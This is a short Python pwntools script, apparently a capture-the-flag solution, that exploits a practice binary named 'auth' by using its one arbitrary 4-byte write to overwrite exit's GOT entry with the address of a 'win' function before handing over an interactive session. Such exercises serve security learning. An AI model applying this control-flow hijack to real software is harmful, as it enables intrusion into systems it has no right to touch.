from pwn import *

p = process("./auth")
elf = ELF("./auth")
# *exit@got =  win
p.sendlineafter("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\n" , hex(elf.got["exit"]))
p.sendlineafter("Okay, now what value would you like to write to 0x" , hex(elf.sym["win"]))

p.interactive()